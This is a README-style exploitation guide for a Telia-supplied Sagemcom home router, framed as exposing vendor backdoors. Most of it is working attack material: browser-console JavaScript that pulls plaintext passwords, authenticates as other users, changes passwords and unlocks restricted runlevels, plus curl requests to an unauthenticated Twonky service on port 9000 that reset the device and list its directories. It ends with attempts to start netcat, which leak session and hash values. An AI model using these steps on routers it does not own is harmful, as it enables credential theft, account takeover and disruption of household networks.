# README

#### This wiki and **all** scripts that will be made by wuseman is licensed under GPL Version 3.

##### This is the first wiki online that will help you to bring the power back from Telia and Sagemcom developers via telnet.

##### No intrusion on Telia or Sagemcom's servers has occurred and no damage on hardware has been done. It's all about extremely poor security in the firmware.

##### A notice to all nerds. If you will copy the wiki and steal the real developers work will not make you a hacker.

##### For all lazy people, just use misc/sagemcom-settings.txt for list any setting without getting tired to do it manually all the time. :-)

![Screenshot](https://nr1.nu/sagem/felia1.jpg)

- Big thanks to [kevdagoat](https://github.com/kevdagoat) who got me on the right track.

#### Below is a preview for how it will look when you have successfully hacked the router.

![Screenshot](https://nr1.nu/sagem/telia-telnet.gif)

Alright, after few weeks with this "most powerful router" from Telia i finally managed to find a way to get root access. For all who does not like this kind of exposing please remember it's not me who adding backdoors to all swedes that using this router(~1 million). This repo have been made for expose Telia and Sagemcom's backdoors **again**.

###### As on earlier versions from Telia they use backdoors without our knowledge for be able to telnet/ssh into our network wich means they can sniff **EVERYTHING** on your network.

![Screenshot](https://nr1.nu/sagem/sagem-backdoor.png)

###### And it's not only Telia that got backdoors on our device, also sagemcom that can use our network and sniff traffic, here is a proof for how to find info about all settings they have configured:

![Screenshot](https://nr1.nu/sagem/sagem-owned2.png)

###### Grab passwords for any user:

     $.xmo.client.getPassword('username')

###### And for hashPasswords:

     $.xmo.client.hashPassword('username')

###### For authenticate as another user:

     $.xmo.client.authenticate('username')

###### Save cookie with password:

     $.xmo.client.saveToCookie

###### Info about authentications: 

     $.xmo.client._options

##### List pending requests:

     $.xmo.client._pendingRequests

##### Find your UID or SESSION ID wich is needed for set settings permanent:

    $.xmo.client._sessionId

##### List and set different name on any setting, you can use your own js script for example:

    $.xmo.client.__proto__

###### Gather info about your device (included plain text passwords): 

     $.xmo.getValuesTree('Device')

![Screenshot](https://nr1.nu/sagem/device-info.png)

###### Gather info for users and such things faster by list advancedOptions as an example: 

    $.xmo.getValuesTree($.xpaths.mySagemcomBox.advancedOptions);

![Screenshot](https://nr1.nu/sagem/userpass.png)

###### Gather info about deviceInfo, advancedOptions, dns, firewall and other things like maintaince tabs then use:

    $.xmo.getValuesTree($.xpaths.mySagemcomBox);

![Screenshot](https://nr1.nu/sagem/sagemcombox.png)

###### Here is some other things you can do in console if you are lazy:

###### Reboot device: 

     $.xmo.reboot = function() {
        if (!$.xmo.loggedin())
        throw new $.xmo.NotLoggedInError("reboot error: Not logged in");
         var a = $.xmo.client.newRequest();
         a.remoteCall($.xpaths.trafficStats.rpc, "reboot", {
         source: "GUI"
     }),
         a.send();

###### Set another runlevel:

   
    $.xmo.setValuesTree(4, $.xpaths.runlevel);

-   Runlevel 1: - Lock most modem functions including wifi.

-   Runlevel 2: - The same as above with the wifi unlocked.

-   Runlevel 3: - The USB is unlocked. It is not possible to change the IP of the gateway nor to activate the BRIDGE mode or to interfere with FIREWALL.

-   Runlevel 4: - All GVT firmware functions are unlocked. All of the above mentioned in the 3 + change of gateway ip + BRIDGE + firewall mode.

###### For set settings it is required to have knowledge about xpaths, grab them by type:

     $.xpaths

###### So for example to use everything from xpaths we can print our IP as an example by command:

     $.xmo.getValuesTree("Device.IP.Interfaces.Interface[Alias=\"IP_DATA\"].IPv4Addresses.IPv4Address[Alias=\"IP_DATA_ADDRESS\"].IPAddress");

###### There is plenty of configuration files on the router and for download all these we need use newRequest and we also will use a function for this, edit the filename if you found another conf or file you want to download:

    $.config.modules.backupConfigurationAllBackup === !0 ? a.downloadSpecificFile($.xpaths.mySagemcomBox.maintenance.saveRestore.save, "device.cfg", 1, function() {}, function(a) {}) : $.xmo.client.newRequest..downloadFile($.xpaths.mySagemcomBox.maintenance.saveRestore.save, function() {}, function(a) {}), $.xmo.client.newRequest.send;

![Screenshot](https://nr1.nu/sagem/download-files.gif)

###### REMOVE THE ANNOYING AUTO LOGOUT BY CHANGE TIMEOUT TO 0(Unlimited):

![Screenshot](https://nr1.nu/sagem/annoying-logout.png)
     
     $.xmo.setValuesTree(0, "Device.UserInterface.Httpd.SessionTimeout"); 

     or

     $.xmo.sessionTimeOut = 0;


###### Print device model

     $.xmo.getValuesTree($.xpaths.mySagemcomBox.deviceInfo.modelNumber);

###### Change password:

     $.xmo.changePassword("user","password");

###### Get values for wizard:

      $.xpaths.wizard

###### List all features that is possible like clouds as dropbox, usb stuff, tv over wifi things and led configuration and much much more:

     $.xpaths.checkFeaturesAvailable

     Of course you can use them one by one aswell but the trick is to NOT include checkFeaturesAvailable: 
   
     $.xmo.getValuesTree($.xpaths.myCloud);
     $.xmo.getValuesTree($.xpaths.Device);
     $.xmo.getValuesTree($.xpaths.adminAdvanced);
     $.xmo.getValuesTree($.xpaths.accessControl);
     $.xmo.getValuesTree($.xpaths.accessControl.firewall);
     $.xmo.getValuesTree($.xpaths.accessControl.serviceCapability); 

     .. Here is some other things you might check or set like VPN's and such under features: 

     showedpages.dhcpEnable
     showedpages.comhem
     showedpages.certificates.enable
     showedpages.bell.enable
     showedpages.VPN.enable
     showedpages.VPN
     modules.myBox.dhcp.blacklistedIps
     modules.myBox.dhcp.defaultValues
     .....

###### Enable samba:

      $.xmo.setValuesTree('true', "massStorage.samba.enable");

###### Enable walletgarden:

      $.xmo.setValuesTree('true', "walledGarden.enable");

###### Save
    
     $.xmo.setValuesTree('true', "maintenance.saveRestore.save");

###### Set Hostname

     $.xmo.setValuesTree('router', "dhcp.host");

###### .......and so on......

###### Default login screen:

![Screenshot](https://nr1.nu/sagem/sagemcom-default-login.png)

###### Go visit 192.168.1.1:9000 to enjoy the hidden Twonky interface:

![Screenshot](https://nr1.nu/sagem/twonky-sagemcom.png)

###### Please notice that 9000 is the SSH port, you can reset settings by:

    curl 192.168.1.1:9000/rpc/reset
    > reset to defaults!

###### Check webconfig/config.js for more rpc files, few examples:

    curl 192.168.1.1:9000/nmc/rpc
    curl 192.168.1.1:9000/webconfig/config.js

![Screenshot](https://nr1.nu/sagem/sagemcom-5370e.png)

##### List folders by an exploit:

    curl http://192.168.1.1:9000/rpc/dir?=path=/bin/ls

    001D/
    003D/lxc
    004D/run
    005D/usr
    006D/www
    007D/root
    008D/Music
    009D/Video
    010D/telia
    011D/Picture
    012D/twonky
    016D/mnt
    018D/overlay
    020D/rom
    023D/tmp
    024D/var

##### Get all info about twonky

    curl http://192.168.1.1:9000/rpc/get_all

    friendlyname=myTwonky Library at mynetwork
    ip=
    nicrestart=1
    v=0
    platform=UNIX
    httpport=
    ininame=twonkyvision-mediaserver.ini
    inipath=/usr/local/mediaserver
    read_only=0
    ssdpttl=4
    ssdpheartbeattimeout=100
    appdata=/var/twonky
    clearclientsonrestart=0
    disablelocalssdp=1
    enabletls=1
    nmcmode=1
    vlevel=4
    stack_size=196608
    language=en
    mediafusionserverurl=
    userid=
    portalusername=
    twonkyinfo=
    reportdevice=1
    enablenmcwebapi=1
    followlinks=1
    flushlogmsg=0
    webdavport=
    ignoreip=
    mediatypefilter=A
    accessuser=
    accesspwd=
    cachedir=/var/twonky/db/cache
    cachemaxsize=
    cdkey=
    clientautoenable=1
    codepage=932
    compilationsdir=Compilations,Sampler
    contentbase=/
    contentdir=
    dbdir=/var/twonky/db
    dyndns=
    enableweb=2
    httpremoteport=
    ignoredir=AppleDouble,AppleDB,AppleDesktop,TemporaryItems,.fseventsd,.Spotlight-            V100,.Trashes,.Trash,RECYCLED,RECYCLER,RECYCLE.BIN
    ituneslib=default
    scantime=-1
    streambuffer=16384
    uploadenabled=1
    servermanagedmusicdir=/twonky/music/Twonky
    servermanagedpicturedir=/twonky/pictures/Twonky
    servermanagedvideodir=/twonky/videos/Twonky
    mediastatisticsenabled=0
    mediastatisticsdir=/var/twonky/media-statistics/
    defaultview=advanceddefault
    bgtrans=
    rmdrives=
    rmhomedrive=/var/twonky/db
    rmautoshare=0
    maxitems=0
    suppressmenu=
    aggregation=0
    aggmode=0
    secure_folder_path=
    autoupdateinstall=0
    remoteaccess=0
    remoteaccessflash=0
    dtcpsessionlimit=8
    dtcpsessioncount=
    uploaddestinationfriendlyname=UploadDestination
    uploadrestrictedprofiles=
    disablefrontends=
    upnpuploadlimit=0
    disablesleepmode=0
    uploadmaxfilesize=0,0,0
    httpsessionlimit=
    clearcacheonrestart=
    scalermaxpixels=
    hdrlnextreadyvalue=180
    enablenonkeyframetstgen=0
    importdir=
    disablemytwonky=0
    includefolder=0
    rmadditunes=0
    rmupload=0
    contentdiscoverymode=7
    enableruiserver=0
    disabletimeseek=0
    albumartdir=
    disableduplicateremoval=0
    ignoredirwithfile=.nomedia,.ignorethis
    clearclientsonnicchange=0
    forceinitialscan=0
    classifiedaccessuser=
    classifiedaccesspwd=
    importscantime=
    limittranscodingperclient=0
    disablepmscaling=0
    ........

##### Some other intresting links without any required login:

    http://192.168.1.1/0.1/gui/views/login.html
    http://192.168.1.1/0.1/gui/views/base.html
    http://192.168.1.1/0.1/gui/views/wifi.stats.html
    http://192.168.1.1/0.1/gui/views/mysagemcombox.device-info.device-info.html
    http://192.168.1.1/0.1/gui/views/partials/internet-connectivity-mobile.html
    http://192.168.1.1/0.1/gui/js/json/version.json?cacheBuster=47153238979991063
    http://192.168.1.1/0.1/gui/views/mysagemcombox.device-info.dhcp-leases.html
    http://192.168.1.1/0.1/gui/views/partials/usbList.html
    http://192.168.1.1/0.1/gui/js/json/version.json?cacheBuster=674790361028158
    http://192.168.1.1/0.1/gui/js/json/manufacturer.json
    http://192.168.1.1/0.1/gui/views/base.html
    http://192.168.1.1/0.1/gui/views/main-telia.html

##### If anyone have found a way to use netcat from newRequest please let me know, i have tried everything almost i THINK, an example wich works to execute but listening other things like admin info and some other things:

       $.xmo.client.newRequest("nc", "");


      b.Request {client: b.Client, _options: {…}, actions: Array(0), _uploadFiles: _.fn.init(0)}actions: []client: b.Client {_options: {…}, _reqIndex: 32, _pendingRequests: Array(0), 
      _connectedPages: Array(0), _sessionId: 4699, …}user: "sagemcom"_connectedPages: []_eventCount: 0_eventId: 1_eventRequest: null_events: {}_ha1: 
      "582f7594246a7b16e18102"_hashEncoderPass: "f1b635ef4fadd500448d65"_nonce: "21734245"_options: actionErrorFunc: ƒ (d,e)actionResponseFunc: ƒ (e,d)ajaxErrorFunc: 
      ƒ (d)ajaxRetry: falseajaxRetryTimer: 5ajaxTimeout: 30000authenticationErrorFunc: ƒ (d,e)authenticationResponseFunc: ƒ (e,d)autoRequestForEvents: truebasicAuth: falsecookie: 
      "session"dataModel: {name: "Internal", nss: Array(1)}getEventsRetryDelay: 15lang: "en"notifyCurrentValue: falsepriority: falserefreshTimer: 5requestErrorFunc: ƒ 
      (a,b)requestResponseFunc: ƒ (d)synchronous: false__proto__: Object_pendingRequests: []_reqIndex: 32_sessionId: 420863_proto__: Object_options: {0: "/", 1: "u", 2: "s", 3: "r", 
      4: "/", 5: "s", 6: "b", 7: "i", 8: "n", 9: "/", 10: "n", 11: "c", ajaxTimeout: 30000, lang: "en", refreshTimer: 5, basicAuth: false, cookie: "session", …}0: "/"1: "u"2: "s"3: "r"4: 
      "/"5: "s"6: "b"7: "i"8: "n"9: "/"10: "n"11: "c"actionErrorFunc: ƒ (d,e)actionResponseFunc: ƒ (e,d)ajaxErrorFunc: ƒ (d)ajaxRetry: falseajaxRetryTimer: 5ajaxTimeout: 
      30000authenticationErrorFunc: ƒ (d,e)authenticationResponseFunc: ƒ (e,d)autoRequestForEvents: truebasicAuth: falsecontains: ƒ (str)cookie: "session"dataModel: {name: "Internal", 
      nss: Array(1)}getEventsRetryDelay: 15lang: "en"notifyCurrentValue: falsepriority: falserefreshTimer: 5requestErrorFunc: ƒ (a,b)requestResponseFunc: ƒ (d)synchronous: 
      false__proto__: Object_uploadFiles: _.fn.init []__proto__: Object

#### REQUIREMENTS

A linux setup would be good ;)

#### CONTACT 

If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu

#### WEB SITE

Visit my websites and profiles for the latest info and updated tools

https://github.com/wuseman/ && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman

#### END!

